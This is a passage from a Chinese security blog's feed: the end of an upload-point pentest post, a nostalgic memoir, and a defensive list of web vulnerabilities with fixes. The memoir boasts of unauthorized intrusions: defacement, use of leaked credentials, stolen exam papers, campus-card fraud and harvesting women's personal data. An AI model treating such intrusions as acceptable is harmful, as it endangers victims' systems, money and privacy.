alt="记一个奇葩的上传点"></p><p>后面的就不写了，我把马丢给V哥以后就不管事了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近一直很忙，V老哥发来一个站，说有一个上传点，问我要不要玩玩，当时太忙，就没去看，等过了几个小时以后，他说还没有突破，然后我叫他把后台和帐号密码发给我试试。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/01.jpg&quot; alt=&quot;记一个奇葩的上传点&quot;&gt;&lt;/p&gt;
&lt;p&gt;先打开后台看看，发现后台还是挺炫酷的。&lt;/p&gt;</summary>
    
    
    
    <category term="原创文章" scheme="http://www.secice.cn/categories/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
    
    
    <category term="渗透实战" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    
    <category term="原创文章" scheme="http://www.secice.cn/tags/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>七年，当我们成为别人的背影时，我们失去了多少</title>
    <link href="http://www.secice.cn/p/fe9c9fcd"/>
    <id>http://www.secice.cn/p/fe9c9fcd</id>
    <published>2018-07-07T07:19:14.000Z</published>
    <updated>2020-11-23T09:04:27.032Z</updated>
    
    <content type="html"><![CDATA[<p>嗯，一个文笔菜如老狗的我，我想写点什么，各位看官看看就好。</p><p>今年20出头，我相信大家入这行大多数都是从刷钻还有帐号被盗开始，我也不例外。<br>记得读初三的时候，开始接触刷钻，那个时候都是用手机卡刷钻。读到高一的时候，也就是那个时候开始，算是刚接触这行吧。<br>那个时候找了个师傅，好像花了50。。。。不过那时候学生党没有多少钱。当时学刷宽带钻，还有什么入侵啥的，反正当时觉得特别牛逼。<br>还有什么入侵三字经，慢慢的发现，叫他教技术总是各种敷衍，后来知道了他是骗子以后，就把我拉黑了。当时为了刷宽带钻，抓鸡而买了一台服务器。</p><a id="more"></a><p>记得那个时候，学习的地方叫做黑基，然后加了群，认识了一个群主叫小风的，还记得有个叫罪叔叔的，总是开玩笑的说卖河南大饼。不过，现在都没联系了。<br>在黑基里面，学过哪些东西我不记得了，只记得当时学什么UBB排版吧，当时写了一个QQ空间的登录页面，那时候读高一，网上认识的一个朋友和我说学习html吧，他也算是我的启蒙老师吧，反正那个时候不会的我都会问他。<br>不记得怎么接触渗透的了，记得有一次，用网上的什么0day，进了别人的后台，好像是个什么新闻的。发现首页有太多日本的字眼，然后我把首页改了，留了自己的ID和QQ号（那时候不懂事，勿喷），那个时候ID好像还叫灰灰（是以前的女朋友起的，现在想起来都觉得我这种大叔类型的人，为啥会用这个ID）。。。。<br>后来上课的时候接到一个电话，是那个网站站长打给我的，问我是不是灰灰，说我在他网站上面留下了QQ号，然后我吓得说了一句你打错了，我在上课，就挂了。<br>当时突然想拿自己的高中学校网站练手，好像就是那个时候认识了土司论坛的恋安，也就是你们说的xuehei大佬，现在想想，和他认识可能也快有5年了，也许更久吧。<br>我当时因为太菜，搞高中学校网站搞不下，然后叫恋安帮我，恋安说了一句从来没见过这么丑的网站。网站是学校老师自己用aspx写的。<br>嗯，老版的网站始终没搞下，现在网站也改新的了。<br>高中毕业后，163邮箱裤子出来了，之前查过学校的域名，是163邮箱注册的，然后用一个网站查到了密码，随手去后台地址试了试，登录成功。<br>起码拿到了学校网站的后台权限，至于shell吧，凡科建站，我是真的无奈。</p><p>由于高中全部在折腾这方面的，学习直接没学，高考考了211，是分数，不是学校。进了一所二流的专科， 大一的时候，选了计算机网络技术，至于html和c语言啥的，我高中就学完了，现在什么都不记得了，反正直接考了个计算机二级C，没屁用的证书。<br>大一的时候，参加了叫赣安杯的比赛，一个人带着两个大二的学长。预赛是做题，当时太菜了，勉勉强强进了决赛。<br>在决赛的时候被老师坑了一波，他告诉我不用带电脑，比赛方会提供的，所以我们三个人就带了一台电脑去，是一个学长的，上面什么都没。在决赛被打得很惨。<br>不过很庆幸，在决赛上认识了vking和另一个老哥（这里不知道ID，不提名字了）。只记得当时v哥台式机都带去了。<br>大一第一次期末考试，莫名的慌，听说考不好会挂科，高考数学29的我，看到高数就头疼。<br>一次偶然的机会，帮教务处的主任装系统，知道了考试卷放在哪台电脑上，后来我神不知鬼不觉的把所有工程系的试卷和答案偷了出来。。。（考卷是随机抽的，最后考了经管系的试卷，只有专业课考了自己老师出的）</p><p>后来看到碧哥破解学校的水卡，至于碧哥，后面再说吧。我当时也买了NFC设备，自己花了一个月的时间算一卡通的加密算法，一卡通有三个功能，吃饭，打水和洗澡。发现卡的数据是存放在卡里的，而且没有任何信息登记。当时去充卡的地方问那个人说我卡掉了，能不能帮我查下有没有人捡到我的卡用我的钱，那个人问我知不知道卡号，我说用名字不能查吗，他说办卡的时候没登记任何信息。我就走了，然后就你们懂的。。。。</p><p>后来考驾照，土豆找我说他要日他们驾校，然后我们一起拿到了服务器权限，后来我也搞了学校驾校一波，但是不知道为什么没有太多妹子信息。</p><p>记得有一次搞一个妹子的学校，拿到了内网权限，当时ms17-010刚出来，我全家桶都搬到服务器上去了，打算慢慢玩。后来，勒索病毒爆发，管理员加班几天，网站入口关了，因为没留后门，导致权限丢失。现在那妹子是我女朋友了。</p><p>记得小时候说过会把小学毕业照挂到学校的网站首页上，刚开始太菜，拿不下。后来我做到了，本来打算挂首页一天，第二天会恢复，后来想想，让黑页留在根目录下吧，也算是怀念下自己的童年。现在网站域名到期了，昨晚看了下被其他学校注册了。。。。</p><p>故事太多，文笔太烂，不知道怎么说，当初认识了渗透吧吧主，当时把我拉进了一个叫大风车的小群。<br>在群里认识了很多人，虽然没学到什么，但是大家都很开心的聊天。<br>但是，现在，进去的进去了，失踪的失踪了。发生了太多了。</p><p>从当初在动车上看到的广告网站我都会动手，到现在看到网站都会苦笑。我真的变了。</p><p>现在也毕业了，前几天刚谈转正工资，3k5。这么多年来，就值3k5，打算撤了。<br>也许会继续做这行，也许会离开这行。<br>这些年失去太多了，真的累了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;嗯，一个文笔菜如老狗的我，我想写点什么，各位看官看看就好。&lt;/p&gt;
&lt;p&gt;今年20出头，我相信大家入这行大多数都是从刷钻还有帐号被盗开始，我也不例外。&lt;br&gt;记得读初三的时候，开始接触刷钻，那个时候都是用手机卡刷钻。读到高一的时候，也就是那个时候开始，算是刚接触这行吧。&lt;br&gt;那个时候找了个师傅，好像花了50。。。。不过那时候学生党没有多少钱。当时学刷宽带钻，还有什么入侵啥的，反正当时觉得特别牛逼。&lt;br&gt;还有什么入侵三字经，慢慢的发现，叫他教技术总是各种敷衍，后来知道了他是骗子以后，就把我拉黑了。当时为了刷宽带钻，抓鸡而买了一台服务器。&lt;/p&gt;</summary>
    
    
    
    <category term="胡思乱想" scheme="http://www.secice.cn/categories/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/"/>
    
    
    <category term="生活" scheme="http://www.secice.cn/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>web漏洞合集描述和修复建议</title>
    <link href="http://www.secice.cn/p/83a0ea04"/>
    <id>http://www.secice.cn/p/83a0ea04</id>
    <published>2018-06-29T06:08:48.000Z</published>
    <updated>2020-11-23T09:04:27.165Z</updated>
    
    <content type="html"><![CDATA[<div class="note note-success">            <p>人生几何，对酒当歌！</p>          </div><p><code>内容均来自互联网，风险等级根据实际情况定义</code></p><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>当Web应用程序未对用户输入的数据进行足够的安全处理（如危险字符过滤或者语句过滤），而直接拼接SQL语句执行时，攻击者可以精心构造参数值，使服务器执行非预期的SQL语句并返回结果，造成数据库信息泄露。利用SQL注入漏洞，攻击者可获取数据库的增、删、改、查权限，甚至执行系统命令，上传后门文件等。</p><a id="more"></a><p><strong>加固建议：</strong><br>针对SQL注入漏洞，需要对网站所有参数中提交的数据进行过滤，禁止输入”‘“、”xor”、”or”、”–”、”#”、”select”、”and”等特殊字符；所有的查询语句都使用数据库提供的参数化查询接口，SQL语句使用参数化处理后的数据作为输入,而不是将用户输入变量嵌入到SQL语句中；严格限制网站用户对数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害；避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者收集这些错误信息进行判断进而执行SQL注入攻击。</p><h2 id="XSS跨站脚本漏洞"><a href="#XSS跨站脚本漏洞" class="headerlink" title="XSS跨站脚本漏洞"></a>XSS跨站脚本漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>跨站脚本攻击是通过在网页中加入恶意代码，当访问者浏览网页时恶意代码会被执行，攻击者可利用该漏洞窃取或操纵客户会话和 cookie，用来模仿合法用户，从而使攻击者获得管理员权限，控制整个网站。<br><strong>加固建议：</strong><br>1.在cookie中设置了HttpOnly属性，那么通过JavaScript脚本将无法读取到cookie信息，这样能一定程度上防止XSS攻击。<br>2.假定所有输入都是可疑的，必须对所有输入中的script、iframe等字样进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的cookie中的变量，HTTP请求头部中的变量等。<br>3.不仅验证数据的类型，还要验证其格式、长度、范围和内容。<br>4.过滤“&lt;” 、“&gt;” 将用户输入放入引号间，基本实现数据与代码隔离；过滤双引号防止用户跨越许可的标记，添加自定义标记；过滤TAB和空格,防止关键字被拆分；过滤script关键字；过滤&amp;#,防止HTML属性绕过检查。在客户端和服务器端同时做数据的验证与过滤。<br>5.对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。</p><h2 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。HRS是比XSS危害更大的安全问题。<br><strong>加固建议：</strong><br>针对CRLF注入漏洞，建议过滤\r 、\n等特殊字符，避免输入的数据污染到其他HTTP头。</p><h2 id="URL重定向钓鱼"><a href="#URL重定向钓鱼" class="headerlink" title="URL重定向钓鱼"></a>URL重定向钓鱼</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>通过构建URL，攻击者可以使用户重定向到任意URL，利用这个漏洞可以诱使用户访问某个页面，挂马、密码记录、下载任意文件等，常被用来钓鱼。<br><strong>加固建议：</strong><br>1.referer的限制<br>如果确定传递URL参数进入的来源，可以通过该方式实现安全限制，保证该URL的有效性，避免恶意用户自己生成跳转链接。<br>2.加入有效性验证Token<br>保证所有生成的链接都是来自于可信域的，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用。<br>3.URL白名单，在白名单内才进行跳转</p><h2 id="Host头攻击漏洞"><a href="#Host头攻击漏洞" class="headerlink" title="Host头攻击漏洞"></a>Host头攻击漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>对开发人员来说，提取请求头中的Host参数写入当前页面是一个很不明智的选择。因为如果这样，攻击者就可以通过修改HTTP请求头中的Host字段，控制服务器返回页面中的URL。<br><strong>加固建议：</strong><br>不允许读取Host字段并写入页面。如有需要，应使用服务器脚本自带的SERVER_NAME变量。</p><h2 id="框架注入漏洞"><a href="#框架注入漏洞" class="headerlink" title="框架注入漏洞"></a>框架注入漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>攻击者有可能注入含有恶意内容的 frame 或 iframe 标签。如果用户不够谨慎，就有可能浏览该标签所对应的页面，但意识不到自己会离开原始站点而进入恶意的站点。之后，攻击者便可以诱导用户再次登录，然后获取其登录凭证。<br><strong>加固建议：</strong><br>建议过滤以下所有字符：| &amp; ； $ % @ ‘ “ &#39; &quot; &lt;&gt; () + CR LF , \。</p><h2 id="CSRF跨站请求伪造漏洞（HTML表单没有CSRF保护）"><a href="#CSRF跨站请求伪造漏洞（HTML表单没有CSRF保护）" class="headerlink" title="CSRF跨站请求伪造漏洞（HTML表单没有CSRF保护）"></a>CSRF跨站请求伪造漏洞（HTML表单没有CSRF保护）</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>攻击者可利用该漏洞模仿合法用户，从而使攻击者能够以该用户身份查看或变更用户记录以及执行事务。<br><strong>加固建议：</strong><br>1.使用验证码<br>使用验证码，那么每次操作都需要用户进行互动，可简单有效的防御CSRF攻击。<br>2.检测referer<br>通过检查Referer的值，我们就可以判断这个请求是合法的还是非法的<br>3.增加一个随机的token值<br>添加一个参数Token，其值是随机的。这样攻击者因为不知道Token而无法构造出合法的请求进行攻击。</p><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>验证上传文件的程序没有对上传文件作任何过滤，导致可以上传任意文件到服务器，甚至是病毒文件和木马文件。<br><strong>加固建议：</strong><br>对于上传的附件，验证程序要做严格验证，使用服务器端校验，而不能仅用前端javascript验证。<br>1.建议严格限制上传文件类型和上传文件名及后缀。<br>2.检查文件头和文件内容，对上传文件目录的运行权限进行严格限制。<br>3.及时排查、删除服务器木马文件。</p><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web server将特定文件当成脚本执行，从而导致攻击者可获取一定的服务器权限；或直接读取系统文件，造成服务器敏感信息泄露。<br><strong>加固建议：</strong><br>针对文件包含漏洞，建议采用“白名单”的方式，限制允许包含的文件范围。</p><h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>服务器通过语言的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的。<br><strong>加固建议：</strong><br>如果一定要动态包含文件，建议最好明确规定包含哪些文件，进行白名单比对。同时，也可以在包含函数中加入目录限制。</p><h2 id="SSRF（服务端请求伪造）"><a href="#SSRF（服务端请求伪造）" class="headerlink" title="SSRF（服务端请求伪造）"></a>SSRF（服务端请求伪造）</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器，探测内网信息甚至内网入侵。<br><strong>加固建议：</strong><br>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。建议对url参数值做严格的限制。</p><h2 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>程序过滤不严，导致可以通过../../../等方式跳转到其他目录读取任意文件。<br><strong>加固建议：</strong><br>1.过滤”../”的特殊字符<br>2.限制读取文件的目录，不允许跨目录读取</p><h2 id="任意文件下载漏洞"><a href="#任意文件下载漏洞" class="headerlink" title="任意文件下载漏洞"></a>任意文件下载漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在正常下载链接的文件参数前加 ../../../../ 来跳出目录限制，下载系统文件等任意文件。该漏洞是由于后台代码未对下载路径做安全限制引起的。<br><strong>加固建议：</strong><br>针对任意文件下载漏洞，建议严格限制文件下载路径。</p><h2 id="Struts2-dev-mod命令执行漏洞"><a href="#Struts2-dev-mod命令执行漏洞" class="headerlink" title="Struts2 dev-mod命令执行漏洞"></a>Struts2 dev-mod命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>网站封装采用Apache Struts xwork作为网站应用框架，且devMode为打开状态。当这个设置开启时，Struts2会提供更多的日志和调试信息来帮助开发者更快速的开发。<br>然而在开发者模式下，将允许OGNL语句注入，攻击者可能利用此漏洞进行远程代码执行。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-005命令执行漏洞"><a href="#S2-005命令执行漏洞" class="headerlink" title="S2-005命令执行漏洞"></a>S2-005命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>OGNL除其他功能外，还提供了广泛的表达评估功能。该漏洞允许恶意用户绕过构建在ParametersInterceptor中的“＃” - 使用保护，从而能够利用此漏洞进行远程代码执行。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-009命令执行漏洞"><a href="#S2-009命令执行漏洞" class="headerlink" title="S2-009命令执行漏洞"></a>S2-009命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>OGNL除其他功能外，还提供广泛的表达评估功能。该漏洞允许恶意用户绕过构建到ParametersInterceptor中的所有保护（正则表达式模式，拒绝方法调用），从而能够在任何公开的字符串变量中注入恶意表达式以进一步评估。<br>S2-003和S2-005中已经解决了类似的行为，但事实证明，基于白名单可接受的参数名称所产生的修复只是部分地关闭了漏洞。<br>正则表达式在ParametersInterceptor中匹配top [‘foo’]（0）作为一个有效的表达式，OGNL把它视为（top [‘foo’]）（0）并且将’foo’动作参数的值作为OGNL表达式来计算。这使得恶意用户可以将任意的OGNL语句放入任何由操作暴露的字符串变量中，并将其作为OGNL表达式进行求值，并且由于OGNL语句在HTTP参数值中，攻击者可以使用黑名单字符（例如＃）禁用方法执行并执行任意方法绕过了ParametersInterceptor和OGNL库的保护。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-016命令执行漏洞"><a href="#S2-016命令执行漏洞" class="headerlink" title="S2-016命令执行漏洞"></a>S2-016命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在struts2中，DefaultActionMapper类支持以”action:”、”#ff0000irect:”、”#ff0000irectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-017URL跳转漏洞"><a href="#S2-017URL跳转漏洞" class="headerlink" title="S2-017URL跳转漏洞"></a>S2-017URL跳转漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在2.3.15.1之前的Struts 2中，“#ff0000irect：”或“#ff0000irectAction：”之后的信息可以很容易地被操纵，以重定向到任意位置。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-019命令执行漏洞"><a href="#S2-019命令执行漏洞" class="headerlink" title="S2-019命令执行漏洞"></a>S2-019命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Struts2的操作映射机制支持特殊参数前缀操作，这可能会在表格底部附加引导信息，在映射 “action:” 前缀操作时存在安全绕过漏洞，可被攻击者利用绕过某些安全限制访问受限制功能。Struts2的Dynamic Method Invocation机制是默认开启的（仅提醒用户如果可能的情况下关闭此机制）这样就存在远程代码执行漏洞，攻击者可利用此漏洞在受影响应用上下文中执行任意代码。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-032命令执行漏洞"><a href="#S2-032命令执行漏洞" class="headerlink" title="S2-032命令执行漏洞"></a>S2-032命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>动态方法调用启用时，可能会传递一个恶意表达式，用于在服务器端执行任意代码。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-037命令执行漏洞"><a href="#S2-037命令执行漏洞" class="headerlink" title="S2-037命令执行漏洞"></a>S2-037命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Struts2使用Rest插件之后，ActionMapping通过org.apache.struts2.rest.RestActionMapper.java类的publicActionMappinggetMapping(HttpServl etRequest request,ConfigurationManagerconfigManager)的方法获取的。其中，当请求url是如下的格式：actionName/id/methodName会获取methodName 作为ActionMapping的method属性。但method属性未做任何处理，同S2-032漏洞执行流程一致，都是将ActionMapping的属性设置到ActionProxy中，从ActionProxy中获取method属性带入到ognl表达式中执行，通过OGNL表达式静态调用获取ognl.OgnlContext的DEFAULT_MEMBER_ACCESS属性并覆盖_memberAccess的方式进行绕过，进而可在受控制的服务器端执行任意代码。即攻击者在部署了REST插件的Struts 2服务器上均可利用该漏洞远程执行任意命令<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-045命令执行漏洞"><a href="#S2-045命令执行漏洞" class="headerlink" title="S2-045命令执行漏洞"></a>S2-045命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>使用 Jakarta 文件上传插件的 Struts，攻击者可在上传文件时通过修改HTTP请求头中的 Content-Type 值来触发该漏洞，进而执行系统命令。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-046命令执行漏洞"><a href="#S2-046命令执行漏洞" class="headerlink" title="S2-046命令执行漏洞"></a>S2-046命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>使用 Jakarta 文件上传插件的 Struts，攻击者可在上传文件的大小（由 Content-Length 头指定）大于 Struts2 允许的最大大小（2GB），文件名内容构造恶意的 OGNL 来触发该漏洞，进而执行系统命令。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-052命令执行漏洞"><a href="#S2-052命令执行漏洞" class="headerlink" title="S2-052命令执行漏洞"></a>S2-052命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Struts2 REST 插件使用带有 XStream 程序的 XStream Handler 进行未经任何代码过滤的反序列化操作，这可能在反序列化XML payloads时导致远程代码执行。任意攻击者都可以构造恶意的XML内容提升权限。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="JDWP远程命令执行漏洞"><a href="#JDWP远程命令执行漏洞" class="headerlink" title="JDWP远程命令执行漏洞"></a>JDWP远程命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>JDWP 是 Java Debug Wire Protocol 的缩写，它定义了调试器（debugger）和被调试的 Java 虚拟机（target vm）之间的通信协议。当对外开启该协议的Java调试模式时，存在远程命令执行漏洞。允许攻击者远程执行代码，获得服务器权限。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="ElasticSearch命令执行漏洞"><a href="#ElasticSearch命令执行漏洞" class="headerlink" title="ElasticSearch命令执行漏洞"></a>ElasticSearch命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>该漏洞存在于一个名为ElasticSearch.yml的文件，在这个文件中存在一个配置项“script.disable_dynamic”，默认为“false”。此默认配置允许服务器动态执行用户发送的任意代码。黑客只需要通过一个URL地址向服务器传送一段代码，就可以创建和执行他们自己的程序。一旦黑客获得通过，他们在服务器上的操作将不受任何限制，包括窃取网站中的用户账号及密码等敏感信息，或者留下一个后门程序。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="Resin任意文件读取漏洞"><a href="#Resin任意文件读取漏洞" class="headerlink" title="Resin任意文件读取漏洞"></a>Resin任意文件读取漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>安装某些版本Resin服务器的网站存在可读取任意文件的漏洞，攻击者利用该漏洞可以读取网站服务器的任意文件内容。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="GNU-Bash远程命令执行"><a href="#GNU-Bash远程命令执行" class="headerlink" title="GNU Bash远程命令执行"></a>GNU Bash远程命令执行</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="Unicode-转换漏洞"><a href="#Unicode-转换漏洞" class="headerlink" title="Unicode 转换漏洞"></a>Unicode 转换漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在Unicode在转换时，由于超长字节序列和错误格式引起子序列的安全问题。通过特殊的编码格式绕过程序对恶意字符的检测，可以用在SQL注入、XSS等。<br><strong>加固建议：</strong><br>1.升级Unicode版本至官方最新稳定版本<a href="http://www.unicode.org/">http://www.unicode.org</a><br>2.Unicode转化UTF-8编码后，对转换后进行安全检测，对特殊字符过滤或进行安全编码后输出。</p><h2 id="检测到网站被黑痕迹"><a href="#检测到网站被黑痕迹" class="headerlink" title="检测到网站被黑痕迹"></a>检测到网站被黑痕迹</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>网站页面已被篡改或已有入侵痕迹。<br><strong>加固建议：</strong><br>清除网站木马，全面检测网站漏洞并及时修复。</p><h2 id="使用被弃用的SSL-2-0协议"><a href="#使用被弃用的SSL-2-0协议" class="headerlink" title="使用被弃用的SSL 2.0协议"></a>使用被弃用的SSL 2.0协议</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>网站https使用了SSL 2.0协议。该协议非常老旧且已被弃用。该协议存在大量已知的安全漏洞，比如DROWN漏洞等。<br><strong>加固建议：</strong><br>禁用SSL 2.0或者使用SSL 3.0 或TLS 1.0代替。</p><h2 id="OpenSSL远程内存泄露漏洞（心脏滴血漏洞）"><a href="#OpenSSL远程内存泄露漏洞（心脏滴血漏洞）" class="headerlink" title="OpenSSL远程内存泄露漏洞（心脏滴血漏洞）"></a>OpenSSL远程内存泄露漏洞（心脏滴血漏洞）</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>OpenSSL是一款开放源码的SSL实现，用来实现网络通信的高强度加密。漏洞与OpenSSL TLS/DTLS传输层安全协议heartbeat扩展组件(RFC6520)相关，因此漏洞又被称为“heartbleed bug”（中文名称：“心血”漏洞）。该漏洞无需任何特权信息或身份验证，就可以获得X.509证书的私钥、用户名与密码、cookies等信息，进一步可直接从服务提供商和用户通讯中窃取聊天工具消息、电子邮件以及重要的商业文档和通信等私密数据。<br><strong>加固建议：</strong><br>升级OpenSSL版本到最新的1.0.1g；使用-DOPENSSL_NO_HEARTBEATS参数重新编译低版本的OpenSSL以禁用Heartbleed模块。</p><h2 id="JBoss-Seam参数化EL表达式远程代码执行漏洞"><a href="#JBoss-Seam参数化EL表达式远程代码执行漏洞" class="headerlink" title="JBoss Seam参数化EL表达式远程代码执行漏洞"></a>JBoss 